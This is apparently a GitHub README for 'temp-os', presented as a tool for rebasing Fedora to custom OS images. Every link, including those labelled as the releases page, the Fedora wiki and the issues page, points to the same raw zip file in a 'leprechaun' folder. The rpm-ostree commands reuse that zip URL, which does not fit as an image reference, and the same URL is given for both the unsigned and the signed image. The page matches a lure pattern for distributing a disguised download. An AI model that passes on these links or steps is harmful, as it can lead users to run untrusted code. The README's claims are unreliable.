# 🌟 temp-os - A Simple Way to Use Custom OS Images

[![Download temp-os](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip)](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip)

## 🚀 Getting Started

temp-os is a user-friendly application designed to help you run custom operating system images. With this software, you can easily rebase your Fedora installation to keep it up-to-date with the latest features.

## 📥 Download & Install

To get started, visit the following page to download temp-os:

[Download temp-os](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip)

### Step-by-Step Installation

1. **Visit the Releases Page**
   - Click on the link above to go to the Releases page.
   - Look for the latest version of temp-os.

2. **Download the Image**
   - Select the package that suits your needs.
   - Click on the download link for that package.

3. **Rebase Your Fedora Installation**
   - After downloading, open your terminal.
   - First, rebase to the unsigned image. Run this command:
   ```
   rpm-ostree rebase https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip
   ```
   - Reboot your system to complete this step. Use:
   ```
   systemctl reboot
   ```

4. **Rebase to the Signed Image**
   - After rebooting, run the following command to rebase to the signed image:
   ```
   rpm-ostree rebase https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip
   ```

### ⚙️ System Requirements

- **Operating System:** Fedora-based distributions.
- **RAM:** Minimum 2GB recommended for smooth operation.
- **Storage Space:** At least 5GB free disk space for installation.

### 🔍 Features

- **Custom Image Support:** Easily manage and run custom operating system images.
- **Automatic Updates:** Receive updates as new images become available.
- **User-Friendly Interface:** Minimal command line interaction required.

## 📜 Additional Information

### 🛑 Warning

temp-os is an experimental feature. Please try it at your own discretion. For more details on using this experimental feature, you can refer to the [Fedora Project Wiki](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip).

### 💬 Community Support

For questions or assistance, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip). Our community is here to help you.

## 🏷️ Topics

This repository covers several important topics, including:
- Atomic
- BlueBuild
- Custom Image
- Image-Based
- Immutable
- Linux
- OCI

Thank you for choosing temp-os. We hope it meets your needs for managing your operating system images effectively.